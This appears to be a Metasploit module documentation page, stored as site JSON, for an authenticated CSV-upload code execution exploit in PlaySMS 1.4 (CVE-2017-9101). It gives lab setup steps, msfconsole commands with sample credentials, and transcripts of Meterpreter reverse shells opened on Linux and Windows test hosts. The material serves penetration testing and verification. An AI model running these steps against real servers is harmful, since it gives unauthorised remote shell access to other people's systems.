{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/playsms_uploadcsv_exec","result":{"data":{"moduleMetadataJson":{"id":"063b1e10-ae6d-5825-afb7-103085cdc01a","name":"PlaySMS import.php Authenticated CSV File Upload Code Execution","fullname":"exploit/multi/http/playsms_uploadcsv_exec","description":"This module exploits an authenticated file upload remote code excution vulnerability\n          in PlaySMS Version 1.4. This issue is caused by improper file contents handling in\n          import.php (aka the Phonebook import feature). Authenticated Users can upload a CSV\n          file containing a malicious payload via vectors involving the User-Agent HTTP header\n          and PHP code in the User-Agent.\n          This module was tested against PlaySMS 1.4 on VulnHub's Dina 1.0 machine and Windows 7.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/playsms_uploadcsv_exec","documentationSlug":"/modules/documentation/exploit/multi/http/playsms_uploadcsv_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>A malicious file can be uploaded by an authenticated attacker through the import.php (aka the Phonebook import feature) in PlaySMS version 1.4. Additional information and vulnerabilities can be viewed on Exploit-DB <a href=\"https://www.exploit-db.com/exploits/42044/\">42044</a> and <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9101\">CVE-2017-9101</a></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>Available at <a href=\"https://www.exploit-db.com/apps/577b6363d3e8baf4696744f911372ea6-playsms-1.4.tar.gz\">Exploit-DB</a></p>\n<h3 id=\"vulnerable-application-installation-setup\" style=\"position:relative;\"><a href=\"#vulnerable-application-installation-setup\" aria-label=\"vulnerable application installation setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application Installation Setup.</h3>\n<ol>\n<li>Download Application : <code class=\"language-text\">wget https://www.exploit-db.com/apps/577b6363d3e8baf4696744f911372ea6-playsms-1.4.tar.gz</code></li>\n<li>Extract : <code class=\"language-text\">tar -xvf 577b6363d3e8baf4696744f911372ea6-playsms-1.4.tar.gz</code></li>\n<li>Move In WebDirectory : <code class=\"language-text\">mv playsms-1.4/web/* /var/www/html/</code></li>\n<li>make config file: <code class=\"language-text\">cp /var/www/html/config-dist.php /var/www/html/config.php</code></li>\n<li>Change Owner : <code class=\"language-text\">chown -R www-data:www-data /var/www/html/</code></li>\n<li>Set DB creds in config.php File. And dump playsms-1.4/db/playsms.sql in your playsms database.</li>\n<li>Now Visit : <a href=\"http://localhost/\">http://localhost/</a></li>\n</ol>\n<h2 id=\"verification-steps-1\" style=\"position:relative;\"><a href=\"#verification-steps-1\" aria-label=\"verification steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/multi/http/playsms_uploadcsv_exec</code></li>\n<li>Do: <code class=\"language-text\">set rport &lt;port&gt;</code></li>\n<li>Do: <code class=\"language-text\">set rhost &lt;ip&gt;</code></li>\n<li>Do: <code class=\"language-text\">set targeturi SecreTSMSgatwayLogin</code></li>\n<li>Do: <code class=\"language-text\">set username touhid</code></li>\n<li>Do: <code class=\"language-text\">set password diana</code></li>\n<li>\n<p>Do: <code class=\"language-text\">check</code></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] 10.22.1.10:80 The target appears to be vulnerable.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n<li>Do: <code class=\"language-text\">set lport &lt;port&gt;</code></li>\n<li>Do: <code class=\"language-text\">set lhost &lt;ip&gt;</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"playsms-on-ubuntu-linux\" style=\"position:relative;\"><a href=\"#playsms-on-ubuntu-linux\" aria-label=\"playsms on ubuntu linux permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Playsms on Ubuntu Linux</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/playsms_uploadcsv_exec                                             \nmsf exploit(multi/http/playsms_uploadcsv_exec) &gt; set rhost 10.22.1.7\nrhost =&gt; 10.22.1.7\nmsf exploit(multi/http/playsms_uploadcsv_exec) &gt; set targeturi SecreTSMSgatwayLogin\ntargeturi =&gt; SecreTSMSgatwayLogin\nmsf exploit(multi/http/playsms_uploadcsv_exec) &gt; check \n[*] 10.22.1.7:80 The target appears to be vulnerable.\nmsf exploit(multi/http/playsms_uploadcsv_exec) &gt; set username touhid\nusername =&gt; touhid\nmsf exploit(multi/http/playsms_uploadcsv_exec) &gt; set password diana\npassword =&gt; diana\nmsf exploit(multi/http/playsms_uploadcsv_exec) &gt; set lhost 10.22.1.3 \nlhost =&gt; 10.22.1.3\nmsf exploit(multi/http/playsms_uploadcsv_exec) &gt; run \n\n[*] Started reverse TCP handler on 10.22.1.3:4444 \n[+] X-CSRF-Token for login : c9ad6a45cd206228554b237985b344ef\n[*] Trying to Login ......\n[+] Authentication successful: touhid:diana\n[+] X-CSRF-Token for upload : 112cd5ecbdf12daf60391609d19ae3d6\n[*] Trying to upload malicious CSV file ....\n[*] Sending stage (37543 bytes) to 10.22.1.7\n[*] Meterpreter session 2 opened (10.22.1.3:4444 -&gt; 10.22.1.7:56580) at 2018-03-25 17:42:43 +0530\n\nmeterpreter &gt; sysinfo \nComputer    : Dina\nOS          : Linux Dina 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686\nMeterpreter : php/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"playsms-on-windows-7\" style=\"position:relative;\"><a href=\"#playsms-on-windows-7\" aria-label=\"playsms on windows 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Playsms on Windows 7</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/playsms_uploadcsv_exec                                             \nmsf exploit(multi/http/playsms_uploadcsv_exec) &gt; set rhost 10.22.1.9\nrhost =&gt; 10.22.1.9 \nmsf exploit(multi/http/playsms_uploadcsv_exec) &gt; set targeturi web\ntargeturi =&gt; web\nmsf exploit(multi/http/playsms_uploadcsv_exec) &gt; check \n[*] 10.22.1.9:80 The target appears to be vulnerable.\nmsf exploit(multi/http/playsms_uploadcsv_exec) &gt; set username test\nusername =&gt; test\nmsf exploit(multi/http/playsms_uploadcsv_exec) &gt; set password metasploit\npassword =&gt; metasploit\nmsf exploit(multi/http/playsms_uploadcsv_exec) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(multi/http/playsms_uploadcsv_exec) &gt; exploit \n\n[*] Started reverse TCP handler on 10.22.1.3:4444 \n[+] X-CSRF-Token for login : cf467bf4829b355a5f4f2964e853ff2c\n[*] Trying to Login ......\n[+] Authentication successful: test:metasploit\n[+] X-CSRF-Token for upload : 3aca00c2d6a5988ed74fa7d992e14904\n[*] Trying to upload malicious CSV file ....\n[*] Sending stage (37543 bytes) to 10.22.1.9\n[*] Meterpreter session 1 opened (10.22.1.3:4444 -&gt; 10.22.1.9:50065) at 2018-03-25 17:27:57 +0530\n\nmeterpreter &gt; sysinfo \nComputer    : TOUHID-PC\nOS          : Windows NT TOUHID-PC 6.1 build 7600 (Windows 7 Ultimate Edition) i586\nMeterpreter : php/windows\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"063b1e10-ae6d-5825-afb7-103085cdc01a"}}}